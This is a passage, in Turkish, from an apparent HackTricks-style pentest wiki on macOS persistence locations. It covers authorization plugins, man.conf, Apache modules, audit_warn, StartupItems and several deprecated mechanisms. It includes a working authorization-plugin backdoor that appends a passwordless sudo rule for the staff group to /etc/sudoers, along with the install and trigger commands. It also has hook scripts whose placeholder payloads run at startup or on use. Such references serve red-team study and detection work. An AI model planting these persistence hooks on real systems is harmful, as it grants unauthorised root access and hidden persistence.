Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)<sup>[[29]](#references)</sup>\
Writeup: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)<sup>[[30]](#references)</sup>

- sandbox bypass için kullanışlı: [🟠](https://emojipedia.org/large-orange-circle)
- Ancak root olmanız ve ek yapılandırmalar yapmanız gerekir
- TCC bypass: ???

#### Konum

- `/Library/Security/SecurityAgentPlugins/`
- Root gerekir
- Plugin'i kullanmak için authorization database'i yapılandırmak da gerekir

#### Açıklama ve Exploitation

Persistence sağlamak için bir kullanıcı log-in olduğunda çalıştırılacak bir authorization plugin oluşturabilirsiniz. Bu plugin'lerden birinin nasıl oluşturulacağı hakkında daha fazla bilgi için önceki writeup'lara bakın (ve dikkatli olun; kötü yazılmış bir plugin sizi sistemin dışında bırakabilir ve Mac'inizi recovery mode'dan temizlemeniz gerekebilir).<sup>[[29]](#references)[[30]](#references)</sup>
```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```
**Taşı** bundle'ı yükleneceği konuma:
```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```
Son olarak bu Plugin'i yükleyecek **kuralı** ekleyin:
```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>class</key>
<string>evaluate-mechanisms</string>
<key>mechanisms</key>
<array>
<string>CustomAuth:login,privileged</string>
</array>
</dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```
**`evaluate-mechanisms`**, authorization framework'e **authorization için harici bir mechanism çağırması gerektiğini** bildirir. Ayrıca **`privileged`**, bunun root tarafından çalıştırılmasını sağlar.

Şununla tetikleyin:
```bash
security authorize com.asdf.asdf
```
Ve ardından **staff grubu sudo** erişimine sahip olmalıdır (onaylamak için `/etc/sudoers` dosyasını okuyun).

### Man.conf

Writeup: [https://theevilbit.github.io/beyond/beyond_0030/](https://theevilbit.github.io/beyond/beyond_0030/)<sup>[[31]](#references)</sup>

- Sandbox bypass için kullanışlı: [🟠](https://emojipedia.org/large-orange-circle)
- Ancak root olmanız ve kullanıcının man kullanması gerekir
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

- **`/private/etc/man.conf`**
- Root gerekir
- **`/private/etc/man.conf`**: man her kullanıldığında

#### Açıklama ve Exploit

**`/private/etc/man.conf`** config dosyası, man dokümantasyon dosyalarını açarken kullanılacak binary/script'i belirtir. Böylece executable yolu değiştirilebilir ve kullanıcı bazı dokümanları okumak için man kullandığında bir backdoor çalıştırılabilir.<sup>[[31]](#references)</sup>

Örneğin **`/private/etc/man.conf`** içinde şunu ayarlayın:
```
MANPAGER /tmp/view
```
Ardından `/tmp/view` öğesini şu şekilde oluşturun:
```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```
### Apache2

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0025/](https://theevilbit.github.io/beyond/beyond_0025/)<sup>[[32]](#references)</sup>

- Sandbox'u bypass etmek için kullanışlı: [🟠](https://emojipedia.org/large-orange-circle)
- Ancak root olmanız ve apache'nin çalışıyor olması gerekir
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
- Httpd entitlements içermez

#### Konum

- **`/etc/apache2/httpd.conf`**
- Root gereklidir
- Tetikleyici: Apache2 başlatıldığında

#### Açıklama ve Exploit

`/etc/apache2/httpd.conf` dosyasına aşağıdaki gibi bir satır ekleyerek bir module yüklenmesini belirtebilirsiniz:<sup>[[32]](#references)</sup>
```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```
Bu şekilde derlenmiş modülünüz Apache tarafından yüklenecektir. Tek yapmanız gereken, ya **geçerli bir Apple sertifikasıyla imzalamak** ya da sisteme **yeni bir güvenilir sertifika ekleyip** modülü bununla **imzalamaktır**.

Ardından, gerekirse sunucunun başlatılacağından emin olmak için şunu çalıştırabilirsiniz:
```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```
Dylb için kod örneği:
```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
printf("[+] dylib constructor called from %s\n", argv[0]);
syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```
### BSM audit framework

Writeup: [https://theevilbit.github.io/beyond/beyond_0031/](https://theevilbit.github.io/beyond/beyond_0031/)<sup>[[33]](#references)</sup>

- Sandbox bypass için kullanışlı: [🟠](https://emojipedia.org/large-orange-circle)
- Ancak root olmanız, auditd'nin çalışıyor olması ve bir warning oluşturmanız gerekir
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

- **`/etc/security/audit_warn`**
- Root gerekir
- **Tetikleyici**: auditd bir warning algıladığında

#### Açıklama ve Exploit

auditd bir warning algıladığında **`/etc/security/audit_warn`** script'i **çalıştırılır**. Bu nedenle payload'unuzu buraya ekleyebilirsiniz.<sup>[[33]](#references)</sup>
```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```
`sudo audit -n` ile bir uyarıyı zorlayabilirsiniz.

### Startup Öğeleri

> [!CAUTION] > **Bu kullanım dışıdır, bu nedenle bu dizinlerde hiçbir şey bulunmamalıdır.**

**StartupItem**, `/Library/StartupItems/` veya `/System/Library/StartupItems/` içinde bulunması gereken bir dizindir. Bu dizin oluşturulduktan sonra iki özel dosya içermelidir:

1. Bir **rc script'i**: Başlangıçta çalıştırılan bir shell script'i.
2. Özellikle `StartupParameters.plist` olarak adlandırılan ve çeşitli yapılandırma ayarlarını içeren bir **plist dosyası**.

Başlangıç işleminin bunları tanıyıp kullanabilmesi için hem rc script'inin hem de `StartupParameters.plist` dosyasının **StartupItem** dizininin içine doğru şekilde yerleştirildiğinden emin olun.

{{#tabs}}
{{#tab name="StartupParameters.plist"}}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Description</key>
<string>This is a description of this service</string>
<key>OrderPreference</key>
<string>None</string> <!--Other req services to execute before this -->
<key>Provides</key>
<array>
<string>superservicename</string> <!--Name of the services provided by this file -->
</array>
</dict>
</plist>
```
{{#endtab}}

{{#tab name="superservicename"}}
```bash
#!/bin/sh
. /etc/rc.common

StartService(){
touch /tmp/superservicestarted
}

StopService(){
rm /tmp/superservicestarted
}

RestartService(){
echo "Restarting"
}

RunService "$1"
```
{{#endtab}}
{{#endtabs}}

### ~~emond~~

> [!CAUTION]
> Bu bileşeni macOS'umda bulamıyorum; daha fazla bilgi için writeup'ı kontrol edin

Writeup: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)<sup>[[34]](#references)</sup>

Apple tarafından sunulan **emond**, yeterince geliştirilmemiş veya muhtemelen terk edilmiş gibi görünen, ancak hâlâ erişilebilir olan bir logging mekanizmasıdır. Bir Mac yöneticisi için özellikle faydalı olmasa da bu belirsiz servis, threat actor'lar için çoğu macOS admin'i tarafından muhtemelen fark edilmeyecek gizli bir persistence yöntemi olarak kullanılabilir.<sup>[[34]](#references)</sup>

Varlığından haberdar olanlar için **emond**'un kötü amaçlı kullanımını tespit etmek kolaydır. Sistemin bu servise ait LaunchDaemon'ı, tek bir dizinde çalıştırılacak script'leri arar. Bunu incelemek için aşağıdaki komut kullanılabilir:
```bash
ls -l /private/var/db/emondClients
```
### ~~XQuartz~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)<sup>[[3]](#references)</sup>

#### Konum

- **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
- Root gerekli
- **Tetikleyici**: XQuartz ile

#### Açıklama ve Exploit

XQuartz artık **macOS'ta yüklü gelmiyor**, bu nedenle daha fazla bilgi istiyorsanız writeup'a bakın.<sup>[[3]](#references)</sup>

### ~~kext~~

> [!CAUTION]
> Bir kext yüklemek, root olarak bile, o kadar karmaşıktır ki bir exploit'iniz olmadığı sürece bu, pratik bir sandbox-escape veya persistence tekniği olarak kabul edilmez.

#### Konum

Bir KEXT'i startup item olarak yüklemek için **aşağıdaki konumlardan birine** yüklenmesi gerekir:

- `/System/Library/Extensions`
- OS X işletim sistemine yerleşik KEXT dosyaları.
- `/Library/Extensions`
- 3rd party yazılımlar tarafından yüklenen KEXT dosyaları

Şu anda yüklü olan kext dosyalarını şu komutla listeleyebilirsiniz:
```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```
Daha fazla bilgi için [**kernel extensions bölümünü kontrol edin**](macos-security-and-privilege-escalation/mac-os-architecture/index.html#i-o-kit-drivers).

### ~~amstoold~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0029/](https://theevilbit.github.io/beyond/beyond_0029/)<sup>[[35]](#references)</sup>

#### Konum

- **`/usr/local/bin/amstoold`**
- Root gerekir

#### Açıklama ve Exploitation

Görünüşe göre `/System/Library/LaunchAgents/com.apple.amstoold.plist` içindeki `plist`, bir XPC service sunarken bu binary'yi kullanıyordu... Sorun şu ki binary mevcut değildi; dolayısıyla oraya bir şey yerleştirebilir ve XPC service çağrıldığında binary'nizin çalıştırılmasını sağlayabilirdiniz.<sup>[[35]](#references)</sup>

Artık bunu macOS'umda bulamıyorum.

### ~~xsanctl~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0015/](https://theevilbit.github.io/beyond/beyond_0015/)<sup>[[36]](#references)</sup>

#### Konum

- **`/Library/Preferences/Xsan/.xsanrc`**
- Root gerekir
- **Tetikleyici**: Service çalıştırıldığında (nadiren)

#### Açıklama ve exploit

Görünüşe göre bu script'i çalıştırmak çok yaygın değil ve macOS'umda bile bulamadım; bu nedenle daha fazla bilgi istiyorsanız writeup'a bakın.<sup>[[36]](#references)</sup>

### ~~/etc/rc.common~~

> [!CAUTION] > **Bu, modern MacOS sürümlerinde çalışmıyor**

Buraya **başlangıçta çalıştırılacak komutlar** da yerleştirmek mümkündür. Normal bir rc.common script'i örneği:
```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
local test

if [ -z "${NETWORKUP:=}" ]; then
test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
if [ "${test}" -gt 0 ]; then
NETWORKUP="-YES-"
else
NETWORKUP="-NO-"
fi
fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
local program="$1"
local pidfile="${PIDFILE:=/var/run/${program}.pid}"
local     pid=""

if [ -f "${pidfile}" ]; then
pid=$(head -1 "${pidfile}")
if ! kill -0 "${pid}" 2> /dev/null; then
echo "Bad pid file $pidfile; deleting."
pid=""
rm -f "${pidfile}"
fi
fi

if [ -n "${pid}" ]; then
echo "${pid}"
return 0
else
return 1
fi
}

#
# Generic action handler
#
RunService ()
{
case $1 in
start  ) StartService   ;;
stop   ) StopService    ;;
restart) RestartService ;;
*      ) echo "$0: unknown argument: $1";;
esac
}
```
## Persistence teknikleri ve araçları

- [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
- [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

## References

- [1] [2025, Infostealer yılı](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [2] [İyi eski LaunchAgents'ın ötesinde - 1 - shell başlangıç dosyaları](https://theevilbit.github.io/beyond/beyond_0001/)
- [3] [İyi eski LaunchAgents'ın ötesinde - 18 - X11 ve XQuartz](https://theevilbit.github.io/beyond/beyond_0018/)
- [4] [İyi eski LaunchAgents'ın ötesinde - 21 - yeniden açılan uygulamalar](https://theevilbit.github.io/beyond/beyond_0021/)
- [5] [İyi eski LaunchAgents'ın ötesinde - 20 - Terminal tercihleri](https://theevilbit.github.io/beyond/beyond_0020/)
- [6] [İyi eski LaunchAgents'ın ötesinde - 13 - ses eklentileri](https://theevilbit.github.io/beyond/beyond_0013/)
- [7] [Audio Unit Plug-ins (SpecterOps)](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)
- [8] [İyi eski LaunchAgents'ın ötesinde - 12 - QuickLook eklentileri](https://theevilbit.github.io/beyond/beyond_0012/)
- [9] [İyi eski LaunchAgents'ın ötesinde - 22 - LoginHook ve LogoutHook](https://theevilbit.github.io/beyond/beyond_0022/)
- [10] [İyi eski LaunchAgents'ın ötesinde - 4 - cron işleri](https://theevilbit.github.io/beyond/beyond_0004/)
- [11] [İyi eski LaunchAgents'ın ötesinde - 2 - iTerm2 başlangıcı](https://theevilbit.github.io/beyond/beyond_0002/)
- [12] [İyi eski LaunchAgents'ın ötesinde - 7 - xbar eklentileri](https://theevilbit.github.io/beyond/beyond_0007/)
- [13] [İyi eski LaunchAgents'ın ötesinde - 8 - Hammerspoon](https://theevilbit.github.io/beyond/beyond_0008/)
- [14] [İyi eski LaunchAgents'ın ötesinde - 6 - SSHRC](https://theevilbit.github.io/beyond/beyond_0006/)
- [15] [İyi eski LaunchAgents'ın ötesinde - 3 - giriş öğeleri](https://theevilbit.github.io/beyond/beyond_0003/)
- [16] [İyi eski LaunchAgents'ın ötesinde - 14 - atrun](https://theevilbit.github.io/beyond/beyond_0014/)
- [17] [İyi eski LaunchAgents'ın ötesinde - 24 - klasör eylemleri](https://theevilbit.github.io/beyond/beyond_0024/)
- [18] [macOS'ta Persistence için klasör eylemleri (SpecterOps)](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)
- [19] [İyi eski LaunchAgents'ın ötesinde - 27 - Dock kısayolları](https://theevilbit.github.io/beyond/beyond_0027/)
- [20] [İyi eski LaunchAgents'ın ötesinde - 17 - renk seçiciler](https://theevilbit.github.io/beyond/beyond_0017/)
- [21] [İyi eski LaunchAgents'ın ötesinde - 26 - Finder Sync eklentileri](https://theevilbit.github.io/beyond/beyond_0026/)
- [22] ["Mac File Opener" Persistence'ını analiz etme (Objective-See)](https://objective-see.org/blog/blog_0x11.html)
- [23] [İyi eski LaunchAgents'ın ötesinde - 16 - ekran koruyucu](https://theevilbit.github.io/beyond/beyond_0016/)
- [24] [Erişiminizi koruma: macOS Persistence için ekran koruyucular (SpecterOps)](https://posts.specterops.io/saving-your-access-d562bf5bf90b)
- [25] [İyi eski LaunchAgents'ın ötesinde - 11 - Spotlight içe aktarıcıları](https://theevilbit.github.io/beyond/beyond_0011/)
- [26] [İyi eski LaunchAgents'ın ötesinde - 9 - Preference Pane](https://theevilbit.github.io/beyond/beyond_0009/)
- [27] [İyi eski LaunchAgents'ın ötesinde - 19 - periyodik script'ler](https://theevilbit.github.io/beyond/beyond_0019/)
- [28] [İyi eski LaunchAgents'ın ötesinde - 5 - Pluggable Authentication Modules (PAM)](https://theevilbit.github.io/beyond/beyond_0005/)
- [29] [İyi eski LaunchAgents'ın ötesinde - 28 - Authorization Plugins](https://theevilbit.github.io/beyond/beyond_0028/)
- [30] [Authorization Plugins ile kalıcı credential hırsızlığı (SpecterOps)](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)
- [31] [İyi eski LaunchAgents'ın ötesinde - 30 - man yapılandırma dosyası - man.conf](https://theevilbit.github.io/beyond/beyond_0030/)
- [32] [İyi eski LaunchAgents'ın ötesinde - 25 - Apache2 modülleri](https://theevilbit.github.io/beyond/beyond_0025/)
- [33] [İyi eski LaunchAgents'ın ötesinde - 31 - BSM audit framework](https://theevilbit.github.io/beyond/beyond_0031/)
- [34] [İyi eski LaunchAgents'ın ötesinde - 23 - emond, Event Monitor Daemon](https://theevilbit.github.io/beyond/beyond_0023/)
- [35] [İyi eski LaunchAgents'ın ötesinde - 29 - amstoold](https://theevilbit.github.io/beyond/beyond_0029/)
- [36] [İyi eski LaunchAgents'ın ötesinde - 15 - xsanctl](https://theevilbit.github.io/beyond/beyond_0015/)
{{#include ../banners/hacktricks-training.md}}
